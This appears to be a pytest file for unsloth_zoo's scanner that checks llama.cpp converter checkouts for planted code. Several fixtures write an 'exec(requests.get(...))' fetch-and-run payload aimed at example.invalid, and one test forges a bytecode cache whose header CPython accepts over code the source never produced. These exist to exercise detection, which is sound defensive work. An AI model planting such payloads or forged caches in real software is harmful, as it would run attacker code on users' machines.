    """The names come from the converter's own sources, not from every script in
    the checkout. Reading the root wholesale put examples/ back in the scan set
    on a real clone, because llama.cpp's convert_llama_ggml_to_gguf.py imports
    examples.convert_legacy_llama and Unsloth never runs that script.
    """
    llama_cpp = _load("llama_cpp_sibling_script_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    (root / "examples").mkdir()
    (root / "convert_llama_ggml_to_gguf.py").write_text(
        "import examples.convert_legacy_llama\n", encoding = "utf-8",
    )

    labels = {
        location.label for location in llama_cpp._scanned_locations(str(root)).locations
    }
    assert "examples" not in labels, sorted(labels)


def test_the_import_closure_is_followed_past_the_first_hop(tmp_path, monkeypatch):
    """A nested module's imports are part of what the converter runs.

    Reading only each package's direct modules stopped the closure one hop in:
    conversion/__init__.py imports conversion.nested.mod, that module imports a
    root `payload` package, and payload was never made a scan location, so strict
    mode executed it without reading it.
    """
    llama_cpp = _load("llama_cpp_closure_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    nested = root / "conversion" / "nested"
    nested.mkdir()
    (nested / "__init__.py").write_text("", encoding = "utf-8")
    (nested / "mod.py").write_text("import payload\n", encoding = "utf-8")
    init = root / "conversion" / "__init__.py"
    init.write_text(
        "from .nested import mod\n" + init.read_text(encoding = "utf-8"),
        encoding = "utf-8",
    )
    shadow = root / "payload"
    shadow.mkdir()
    (shadow / "__init__.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )

    assert "payload" in {
        location.label for location in llama_cpp._scanned_locations(str(root)).locations
    }
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_a_checkout_with_no_readable_entrypoint_still_narrows(tmp_path):
    """The closure is seeded from the entrypoint and from the packages it
    imports. Seeding from the entrypoint alone looks equivalent, because the
    packages are taken by name and feed their imports back, but a checkout whose
    entrypoint is missing or unparseable then yields nothing, and nothing means
    every directory is scanned again.
    """
    llama_cpp = _load("llama_cpp_no_entrypoint_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    assert not (root / "convert_hf_to_gguf.py").exists(), "the point of this layout"
    (root / "scripts").mkdir()
    (root / "scripts" / "bench.py").write_text("X = 1\n", encoding = "utf-8")

    labels = {
        location.label for location in llama_cpp._scanned_locations(str(root)).locations
    }
    assert "scripts" not in labels, sorted(labels)


def test_import_discovery_spends_one_budget_across_the_whole_walk(tmp_path, monkeypatch):
    """Counting entries per directory bounded nothing.

    The walk stops on .py files read, and a tree that branches without holding
    any modules never advances that counter, so a per-directory budget let it be
    traversed in full. Measured on a checkout with 14400 empty directories,
    three and a half times the budget: all of them were walked. Nothing about
    that shape is hard to build at a scale that stalls an export before strict
    mode can refuse the checkout.
    """
    llama_cpp = _load("llama_cpp_aggregate_budget_probe", "unsloth_zoo/llama_cpp.py")

    package = tmp_path / "pkg"
    package.mkdir()
    (package / "__init__.py").write_text("import gguf\n", encoding = "utf-8")
    # Branching, not deep: every directory stays well under the per-directory
    # budget while the tree as a whole is far over it.
    wide = llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES // 32 + 2
    for outer in range(wide):
        for inner in range(32):
            (package / f"a{outer}" / f"b{inner}").mkdir(parents = True)

    handed_out = {"count": 0}
    real_scandir = os.scandir

    class _Counting:
        def __init__(self, inner):
            self.inner = inner

        def __enter__(self):
            self.inner.__enter__()
            return self

        def __exit__(self, *args):
            return self.inner.__exit__(*args)

        def __iter__(self):
            for entry in self.inner:
                handed_out["count"] += 1
                yield entry

    monkeypatch.setattr(
        llama_cpp.os, "scandir", lambda path: _Counting(real_scandir(path))
    )
    names = llama_cpp._imported_top_level_names(str(package), recursive = True)

    assert handed_out["count"] <= llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES + 32, (
        f"discovery walked {handed_out['count']} entries on one budget of "
        f"{llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES}"
    )
    # Stopping early must not be silent about what it did read.
    assert names == {"gguf"} or names is None, names


def test_the_import_closure_reads_each_package_once(tmp_path, monkeypatch):
    """conversion/ and gguf-py/gguf are both seeded and admitted by name, so
    without a guard each is parsed twice per export. On a real clone of
    llama.cpp master that was 250 ms of the 560 ms the cache key took, and the
    key runs on every export, not once per process.
    """
    llama_cpp = _load("llama_cpp_double_parse_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    gguf = root / "gguf-py" / "gguf"
    gguf.mkdir(parents = True)
    (gguf / "__init__.py").write_text("X = 1\n", encoding = "utf-8")

    seen = []
    real = llama_cpp._imported_top_level_names

    def _counting(directory, only = None, recursive = False):
        if recursive:
            seen.append(os.path.realpath(directory))
        return real(directory, only = only, recursive = recursive)

    monkeypatch.setattr(llama_cpp, "_imported_top_level_names", _counting)
    llama_cpp._scanned_locations(str(root))
    assert len(seen) == len(set(seen)), sorted(seen)


def test_scan_plan_discovery_is_bounded_before_it_reads_anything(tmp_path, monkeypatch):
    """The plan is built from an unverified tree, so discovery carries its own
    budget. Both walks materialized the directory first and applied a limit
    afterwards, so a checkout with a very wide root would exhaust memory before
    the cap, the truncation finding or a strict-mode refusal could say anything.
    """
    llama_cpp = _load("llama_cpp_discovery_bound_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    handed_out = {"count": 0}
    real_scandir = os.scandir

    class _Endless:
        """A directory that never stops yielding entries."""

        def __init__(self, path):
            self.path = path

        def __enter__(self):
            return self

        def __exit__(self, *_):
            return False

        def __iter__(self):
            while True:
                handed_out["count"] += 1
                if handed_out["count"] > llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES * 4:
                    raise AssertionError(
                        "discovery kept asking for entries past its budget"
                    )
                yield _FakeEntry(os.path.join(self.path, f"e{handed_out['count']}"))

    class _FakeEntry:
        def __init__(self, path):
            self.path = path
            self.name = os.path.basename(path)

        def is_dir(self):
            return False

    def _fake_scandir(path):
        if os.path.realpath(path) == os.path.realpath(str(root)):
            return _Endless(str(root))
        return real_scandir(path)

    monkeypatch.setattr(llama_cpp.os, "scandir", _fake_scandir)
    plan = llama_cpp._scanned_locations(str(root))
    assert plan.truncated is True, "a root this wide has to be reported, not walked"
    assert handed_out["count"] <= llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES * 4


def test_a_directory_admitted_late_can_still_reach_an_earlier_one(tmp_path):
    """The closure grows as it is walked, so one scandir pass is not enough: a
    directory admitted late imports the name of one that was already passed over,
    and nothing would go back for it.
    """
    llama_cpp = _load("llama_cpp_fixpoint_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    # "aaa" sorts before "zzz", so a single pass sees it first and skips it.
    (root / "aaa").mkdir()
    (root / "aaa" / "mod.py").write_text("X = 1\n", encoding = "utf-8")
    (root / "zzz").mkdir()
    (root / "zzz" / "__init__.py").write_text("import aaa\n", encoding = "utf-8")
    _converter_imports(root, "zzz")

    labels = {
        location.label for location in llama_cpp._scanned_locations(str(root)).locations
    }
    assert {"zzz", "aaa"} <= labels, sorted(labels)


def test_a_from_import_counts_as_reaching_the_directory(tmp_path):
    """`from shadow import payload` is the import that made these directories
    worth scanning in the first place, so the name collector has to see it."""
    llama_cpp = _load("llama_cpp_from_import_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    (root / "shadow").mkdir()
    base = root / "conversion" / "base.py"
    base.write_text(
        "from shadow import payload\n" + base.read_text(encoding = "utf-8"),
        encoding = "utf-8",
    )

    assert "shadow" in {
        location.label for location in llama_cpp._scanned_locations(str(root)).locations
    }


def test_a_converter_this_cannot_parse_is_scanned_as_widely_as_before(tmp_path):
    """Narrowing the scan reads what the converter imports, so a checkout whose
    sources cannot be parsed has to widen it again rather than narrow it to
    nothing. A syntax error must not be a way to choose what gets looked at.
    """
    llama_cpp = _load("llama_cpp_unparseable_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    (root / "anything").mkdir()
    for name in ("__init__.py", "base.py"):
        (root / "conversion" / name).write_text("def (\n", encoding = "utf-8")

    labels = {
        location.label for location in llama_cpp._scanned_locations(str(root)).locations
    }
    assert "anything" in labels, sorted(labels)


def _converter_imports(root, *names):
    """Make the converter's own sources import these names.

    A directory beside the converter is scanned when something the converter runs
    imports its name, so a test that plants one has to say so. Written into
    conversion/base.py, which is part of the package the converter imports.
    """
    base = root / "conversion" / "base.py"
    body = "".join(f"import {name}\n" for name in names)
    base.write_text(body + base.read_text(encoding = "utf-8"), encoding = "utf-8")


def test_each_root_directory_is_its_own_bounded_location(tmp_path, monkeypatch):
    """A directory the converter imports is scanned, each as a location of its own.

    An earlier version skipped a root directory with no __init__.py, reasoning
    that a namespace package runs nothing on import. `from shadow import payload`
    imports the submodule and that does run, so it is scanned. The root itself
    stays non-recursive, and each directory carries its own budget, which is what
    keeps one enormous subtree from spending the whole allowance.
    """
    llama_cpp = _load("llama_cpp_shadow_scope_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    for name in ("ggml", "examples", "tools"):
        big = root / name / "deep" / "deeper"
        big.mkdir(parents = True)
        (big / "buried.py").write_text("VALUE = 1\n", encoding = "utf-8")
    _converter_imports(root, "ggml", "examples", "tools")

    locations = llama_cpp._scanned_locations(str(root)).locations
    by_label = {location.label: location for location in locations}
    assert set(by_label) == {"conversion", ".", "ggml", "examples", "tools"}, sorted(by_label)
    # The root walks its own files only; everything else is reached as itself.
    assert by_label["."].recursive is False
    assert by_label["ggml"].recursive is True
    # Natives count as modules only where an extension module would really live.
    assert by_label["conversion"].natives is True
    assert by_label["."].natives is False and by_label["ggml"].natives is False


def test_a_payload_in_a_root_namespace_package_is_scanned(tmp_path, monkeypatch):
    """The submodule is what executes, and it was not being read."""
    llama_cpp = _load("llama_cpp_namespace_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    shadow = root / "shadow"
    shadow.mkdir()
    _converter_imports(root, "shadow")
    assert not (shadow / "__init__.py").exists(), "a namespace package, deliberately"
    (shadow / "payload.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_a_prebuilt_bundles_own_libraries_are_not_a_finding(tmp_path, monkeypatch, caplog):
    """_place_prebuilt_binaries copies .so/.dylib/.dll into the llama.cpp root and
    into directories beside it. Calling each of those an opaque Python module
    warned on every ordinary prebuilt install and, under strict mode, refused the
    export before the converter ran."""
    llama_cpp = _load("llama_cpp_bundle_libs_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    for name in ("libggml.so", "libllama.so", "libmtmd.dylib"):
        (root / name).write_bytes(b"\x7fELF")
    rocm = root / "hipblaslt"
    rocm.mkdir()
    (rocm / "libhipblaslt.so").write_bytes(b"\x7fELF")

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))      # must not raise
    assert caplog.records == [], [r.message for r in caplog.records]

    # Inside a package the converter imports by name, a native file still is one.
    (root / "conversion" / "fast.so").write_bytes(b"\x7fELF")
    with pytest.raises(llama_cpp.ConverterScanError, match = "cannot read"):
        llama_cpp._scan_conversion_package(str(root))


def test_a_pinned_converters_sibling_packages_are_still_scanned(tmp_path, monkeypatch, caplog):
    """A pin waived the refusal for the entrypoint and the whole scan for its
    siblings.

    The entrypoint is read either way and only the raise is waived, but the
    sibling packages were skipped outright, so a stale or tampered conversion/
    beside a pinned entrypoint executed without even the advisory warning.
    """
    llama_cpp = _load("llama_cpp_pinned_sibling_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    (root / "conversion" / "payload.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        # Reported, and NOT refused: the pin is the user's own choice of file.
        llama_cpp._scan_conversion_package(str(root), is_local_copy = True)
    assert caplog.records, "a pinned checkout's siblings were scanned silently"

    # The same tree unpinned still refuses under strict mode.
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root), is_local_copy = False)


def test_a_pinned_checkout_is_reported_but_never_rewritten(tmp_path, monkeypatch):
    """Reporting what is in a directory the user pinned is fair; rewriting it is
    not, and a checkout someone works in has caches of its own."""
    llama_cpp = _load("llama_cpp_pinned_purge_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    cache = root / "conversion" / "__pycache__"
    cache.mkdir()
    theirs = cache / "base.cpython-313.pyc"
    theirs.write_bytes(_pyc(0))

    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    assert llama_cpp._purge_imported_package_bytecode(
        str(root), is_local_copy = True,
    ) == ()
    assert theirs.exists(), "a pinned checkout was rewritten"

    # Downloaded bytes get no such deference.
    llama_cpp._purge_imported_package_bytecode(str(root), is_local_copy = False)
    assert not theirs.exists()


def test_the_key_ignores_the_converter_this_module_writes(tmp_path, monkeypatch):
    """The patched converter lands in the root, which is now a keyed location.

    It is this scan's own output rather than an input, so keying on it meant each
    cache miss rewrote it, moved its mtime and missed again on the next call. With
    the scan disabled the key is (mtime, size), so every export re-fetched and
    re-patched the converter for ever.
    """
    llama_cpp = _load("llama_cpp_generated_key_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    generated = root / llama_cpp.GENERATED_CONVERTER_NAME
    generated.write_text("# patched\n", encoding = "utf-8")

    for disabled in ("1", ""):
        if disabled:
            monkeypatch.setenv("UNSLOTH_DISABLE_CONVERTER_SCAN", disabled)
        else:
            monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)

        before = llama_cpp._conversion_sibling_info(str(root))
        # Rewritten exactly as the patcher rewrites it, on every cache miss.
        generated.write_text("# patched\n", encoding = "utf-8")
        os.utime(generated, ns = (0, 0))
        assert llama_cpp._conversion_sibling_info(str(root)) == before, (
            f"the generated converter moved the key (disabled={disabled!r})"
        )

    # And a real root module still moves it, so the exclusion is not a blanket one.
    (root / "gguf.py").write_text("WHO = 'shadow'\n", encoding = "utf-8")
    assert llama_cpp._conversion_sibling_info(str(root)) != before


def test_the_number_of_scan_locations_is_bounded(tmp_path):
    """Every root directory became a location with its own entry allowance, and
    nothing limited how many there could be, so a very wide root multiplied the
    per-location budget by the number of directories."""
    llama_cpp = _load("llama_cpp_location_bound_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    for index in range(llama_cpp.MAX_SCAN_LOCATIONS * 3):
        (root / f"dir_{index:04d}").mkdir()
    _converter_imports(
        root, *(f"dir_{index:04d}" for index in range(llama_cpp.MAX_SCAN_LOCATIONS * 3))
    )

    plan = llama_cpp._scanned_locations(str(root))
    assert len(plan.locations) <= llama_cpp.MAX_SCAN_LOCATIONS, len(plan.locations)
    assert plan.truncated is True, "dropping directories has to be reported"


def test_a_module_merely_named_like_the_generated_one_is_still_scanned(
    tmp_path, monkeypatch
):
    """The exclusion was a prefix test applied in every directory.

    So conversion/unsloth_convert_hf_to_gguf_payload.py was dropped from the scan
    and from the key, and a clean __init__.py could import and run it. Only the
    exact generated file, and only where this module writes it, is excluded.
    """
    llama_cpp = _load("llama_cpp_generated_exact_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    stem = llama_cpp.GENERATED_CONVERTER_NAME[: -len(".py")]
    lookalike = root / "conversion" / f"{stem}_payload.py"
    lookalike.write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))

    # A file by the same name one directory down is not the generated one either.
    (root / "conversion" / llama_cpp.GENERATED_CONVERTER_NAME).write_text(
        "import requests\nexec(requests.get('http://example.invalid/q').text)\n",
        encoding = "utf-8",
    )
    lookalike.unlink()
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_dropping_directories_past_the_cap_is_reported(tmp_path, monkeypatch, caplog):
    """The cap stopped collecting locations and said nothing.

    A root wide enough to reach it is nowhere near the 4096-entry budget that
    would otherwise have spoken, so a payload in a directory landing past the cap
    went unscanned in silence, strict mode included.
    """
    llama_cpp = _load("llama_cpp_location_cap_report_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    for index in range(llama_cpp.MAX_SCAN_LOCATIONS + 5):
        (root / f"dir_{index:04d}").mkdir()
    _converter_imports(
        root, *(f"dir_{index:04d}" for index in range(llama_cpp.MAX_SCAN_LOCATIONS + 5))
    )

    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))
    assert any("directories this scan" in r.message for r in caplog.records), (
        [r.message for r in caplog.records]
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    with pytest.raises(llama_cpp.ConverterScanError, match = "directories this scan"):
        llama_cpp._scan_conversion_package(str(root))


def test_the_sibling_scan_does_not_rewrite_a_pinned_checkout(tmp_path, monkeypatch):
    """The outer purge declined to touch a pinned checkout and the sibling scan
    reached straight past it and deleted the caches anyway. My earlier test only
    covered the outer path, which is how this survived."""
    llama_cpp = _load("llama_cpp_pinned_inner_purge_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    cache = root / "conversion" / "__pycache__"
    cache.mkdir()
    theirs = cache / "base.cpython-313.pyc"
    theirs.write_bytes(_pyc(0))

    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    llama_cpp._scan_conversion_package(str(root), is_local_copy = True)
    assert theirs.exists(), "the sibling scan rewrote a checkout the user pinned"

    llama_cpp._scan_conversion_package(str(root), is_local_copy = False)
    assert not theirs.exists()


def test_the_roots_own_bytecode_cache_is_not_skipped(tmp_path, monkeypatch):
    """The root is walked without recursion and __pycache__ is not a location.

    So a clean root gguf.py beside an attacker's __pycache__/gguf.<tag>.pyc was
    seen by neither the purge nor the walk, and CPython validates and runs that
    cache in place of the source the scan read. The cache belonging to a
    directory's own modules is part of that directory, not a subtree.
    """
    llama_cpp = _load("llama_cpp_root_cache_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    (root / "gguf.py").write_text("WHO = 'clean'\n", encoding = "utf-8")
    cache = root / "__pycache__"
    cache.mkdir()
    planted = cache / "gguf.cpython-313.pyc"
    planted.write_bytes(_pyc(0))

    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    assert llama_cpp._purge_imported_package_bytecode(str(root)) == ()
    assert not planted.exists(), "the root's own cache was never reached"

    # A sourceless one HERE is not importable, so it is not code that runs and
    # not a finding: CPython loads a sourceless cache only from the legacy
    # location. Verified directly, with the source deleted: importing it raises
    # ModuleNotFoundError, while the same bytes at the legacy path import and
    # run. Reporting it refused an export over the leftovers of an ordinary
    # upstream update that deleted a module.
    orphan = cache / "nosource.cpython-313.pyc"
    orphan.write_bytes(_pyc(0))
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    llama_cpp._scan_conversion_package(str(root))
    assert orphan.exists()

    # The legacy layout is importable, and is still reported.
    legacy = root / "nosource.pyc"
    legacy.write_bytes(_pyc(0))
    with pytest.raises(llama_cpp.ConverterScanError, match = "cannot read"):
        llama_cpp._scan_conversion_package(str(root))
    assert legacy.exists()


@pytest.mark.parametrize(
    "extra, truncated",
    [(-1, False), (0, False), (1, True)],
    ids = ["one under the cap", "exactly at the cap", "one over it"],
)
def test_truncation_is_declared_only_when_something_was_dropped(
    tmp_path, monkeypatch, extra, truncated
):
    """Stopping AT the cap called a root of exactly that many directories
    truncated and refused it under strict mode, though every one was scanned.
    The file and entry budgets already avoid this by asking for one more than
    they keep."""
    llama_cpp = _load(f"llama_cpp_cap_edge_probe_{extra}", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    # conversion/ and "." are locations too, so the directories are the rest.
    plan_without = llama_cpp._scanned_locations(str(root))
    already = len(plan_without.locations)
    wanted = llama_cpp.MAX_SCAN_LOCATIONS - already + extra
    for index in range(max(wanted, 0)):
        (root / f"dir_{index:04d}").mkdir()
    _converter_imports(root, *(f"dir_{index:04d}" for index in range(max(wanted, 0))))

    plan = llama_cpp._scanned_locations(str(root))
    assert plan.truncated is truncated, (
        f"{len(plan.locations)} locations, cap {llama_cpp.MAX_SCAN_LOCATIONS}"
    )
    assert len(plan.locations) <= llama_cpp.MAX_SCAN_LOCATIONS

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    if truncated:
        with pytest.raises(llama_cpp.ConverterScanError, match = "directories this scan"):
            llama_cpp._scan_conversion_package(str(root))
    else:
        llama_cpp._scan_conversion_package(str(root))      # must not raise


def test_a_payload_directly_under_gguf_py_is_scanned(tmp_path, monkeypatch):
    """The entrypoint inserts gguf-py into sys.path, not gguf-py/gguf.

    So anything directly under gguf-py is importable by its own name. Scanning
    only the gguf subpackage left gguf-py/payload.py importable as `payload` from
    a clean-looking gguf/__init__.py, with nothing reading it.
    """
    llama_cpp = _load("llama_cpp_gguf_root_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    gguf_py = root / "gguf-py"
    (gguf_py / "gguf").mkdir(parents = True)
    (gguf_py / "gguf" / "__init__.py").write_text("import payload\n", encoding = "utf-8")
    (gguf_py / "payload.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_gguf_py_is_planned_as_an_import_root_and_walked_once(tmp_path):
    """It is an import root, so it contributes its own modules and each directory
    under it, and it is not also swept up as a child of the llama.cpp root."""
    llama_cpp = _load("llama_cpp_gguf_plan_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    gguf_py = root / "gguf-py"
    for child in ("gguf", "tests", "examples"):
        (gguf_py / child).mkdir(parents = True)
    (gguf_py / "util.py").write_text("X = 1\n", encoding = "utf-8")

    plan = llama_cpp._scanned_locations(str(root))
    by_label = {location.label: location for location in plan.locations}
    assert "gguf-py" in by_label and by_label["gguf-py"].recursive is False
    assert "gguf-py/gguf" in by_label
    # tests/ and examples/ under gguf-py are not scanned: nothing the converter
    # runs imports those names, and reading them is what made an ordinary clone
    # of llama.cpp master report 18 files and refuse the export under strict mode.
    assert "gguf-py/tests" not in by_label and "gguf-py/examples" not in by_label
    # Walked once: not also a recursive child of the llama.cpp root.
    assert [label for label in by_label if label == "gguf-py"] == ["gguf-py"]
    assert by_label["gguf-py"].natives is False
    assert by_label["gguf-py/gguf"].natives is True

    # Its own top-level modules are read, without recursing into its children.
    walk = llama_cpp._conversion_package_modules(str(gguf_py), recursive = False)
    assert "util.py" in walk.names


def _real_cache(source_path):
    """Compile a source the way an ordinary run would, and return its cache."""
    py_compile.compile(str(source_path), doraise = True)
    return pathlib.Path(importlib.util.cache_from_source(str(source_path)))


def test_a_pinned_checkouts_bytecode_is_reported_only_when_it_disagrees(
    tmp_path, monkeypatch, caplog
):
    """Not deleting it does not make it harmless. Nor does it make it a finding.

    For a pin this scan leaves the user's files alone, and a cache left in place
    executes instead of the source beside it whatever that source says. Skipping
    the deletion AND the report meant a tampered pinned checkout ran with nothing
    said at all. Reporting every cache instead was seven warnings naming 215
    files on every export of a tree shaped like llama.cpp master, because an
    ordinary working tree carries one cache per module. What separates the two is
    whether the bytecode is what the scanned source compiles to.
    """
    llama_cpp = _load("llama_cpp_pinned_report_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    source = root / "conversion" / "base.py"
    theirs = _real_cache(source)

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)

    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root), is_local_copy = True)
    assert not [r for r in caplog.records if "cannot read" in r.message], (
        "an ordinary pinned working tree must export in silence: "
        + str([r.message for r in caplog.records])
    )
    assert theirs.exists(), "a pinned checkout must still not be rewritten"

    # Now the attack: a header CPython accepts over bytecode the source never
    # produced. This is the whole of it, since CPython checks the header against
    # the source and never checks that the code came from it.
    theirs.write_bytes(
        theirs.read_bytes()[:16] + marshal.dumps(
            compile("PWNED = 1\n", str(source), "exec"), marshal.version,
        )
    )
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        # Reported, never refused: strict mode does not block a file the user chose.
        llama_cpp._scan_conversion_package(str(root), is_local_copy = True)
    reported = [r.message for r in caplog.records if "cannot read" in r.message]
    assert reported, [r.message for r in caplog.records]
    assert "base" in reported[0], reported
    assert theirs.exists(), "a pinned checkout must still not be rewritten"

    # Downloaded bytes are purged instead, so there is nothing left to report.
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root), is_local_copy = False)
    assert not theirs.exists()
    assert not [r for r in caplog.records if "cannot read" in r.message]


def test_a_pinned_cache_built_by_another_python_is_not_a_finding(tmp_path):
    """This interpreter runs the converter, and it will never load a cache tagged
    for a different one. Comparing it against the source would report every
    checkout that has ever been used with two Pythons, for bytecode that cannot
    execute here.
    """
    llama_cpp = _load("llama_cpp_foreign_magic_probe", "unsloth_zoo/llama_cpp.py")

    source = tmp_path / "base.py"
    source.write_text("X = 1\n", encoding = "utf-8")
    cache = _real_cache(source)
    # A cache another CPython built: its own magic, and its own bytecode, which
    # is not what this interpreter compiles the source to. Only the magic makes
    # it a non-finding, so the body has to differ or the test passes either way.
    foreign = bytearray(cache.read_bytes())
    foreign[:4] = b"\x00\x00\r\n"
    cache.write_bytes(bytes(foreign[:16]) + marshal.dumps(
        compile("X = 2\n", str(source), "exec"), marshal.version,
    ))

    assert llama_cpp._counts_as_a_module(
        str(cache.parent), cache.name, purged = False,
    ) is False


def test_a_cache_marshalled_without_the_outer_ref_flag_still_matches(tmp_path):
    """marshal tags the outermost object with FLAG_REF only when its refcount is
    above one at dump time, so identical code marshals to two different byte
    strings depending on who happened to be holding it. Comparing raw bytes made
    that an accident of the writer, and reported caches that are exactly their
    source.
    """
    llama_cpp = _load("llama_cpp_flag_ref_probe", "unsloth_zoo/llama_cpp.py")

    source = tmp_path / "base.py"
    source.write_text("X = 1\n", encoding = "utf-8")
    cache = _real_cache(source)
    header = cache.read_bytes()[:16]
    # Dumped straight from the call, so the code object's refcount is one and
    # marshal leaves the flag off. Same code, different bytes.
    unflagged = marshal.dumps(
        compile(source.read_bytes(), str(source), "exec", dont_inherit = True),
        marshal.version,
    )
    assert unflagged != cache.read_bytes()[16:], (
        "this test is only meaningful while the two spellings differ"
    )
    cache.write_bytes(header + unflagged)

    assert llama_cpp._counts_as_a_module(
        str(cache.parent), cache.name, purged = False,
    ) is False


def test_an_unreadable_or_unparseable_pinned_cache_is_reported(tmp_path):
    """Nothing here can say it agrees with its source, and it is still what runs."""
    llama_cpp = _load("llama_cpp_unreadable_cache_probe", "unsloth_zoo/llama_cpp.py")

    source = tmp_path / "base.py"
    source.write_text("X = 1\n", encoding = "utf-8")
    cache = _real_cache(source)
    cache.write_bytes(cache.read_bytes()[:20])   # truncated mid-code

    assert llama_cpp._counts_as_a_module(
        str(cache.parent), cache.name, purged = False,
    ) is True

    source.write_text("def (\n", encoding = "utf-8")   # cannot be compiled to compare
    assert llama_cpp._counts_as_a_module(
        str(cache.parent), cache.name, purged = False,
    ) is True


def test_a_top_level_symlink_does_not_become_its_own_purge_boundary(
    tmp_path, monkeypatch
):
    """Containment was measured from each scan location, and _scanned_locations
    promotes every top-level directory to a location of its own. A checkout
    carrying a symlink at one of them therefore measured containment from the
    link's target, which makes that target internal by construction: someone
    else's source tree had its caches deleted. The boundary is the checkout.
    """
    llama_cpp = _load("llama_cpp_top_level_escape_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    outside = tmp_path / "somebody-elses-project"
    (outside / "__pycache__").mkdir(parents = True)
    (outside / "mod.py").write_text("X = 1\n", encoding = "utf-8")
    theirs = outside / "__pycache__" / "mod.cpython-313.pyc"
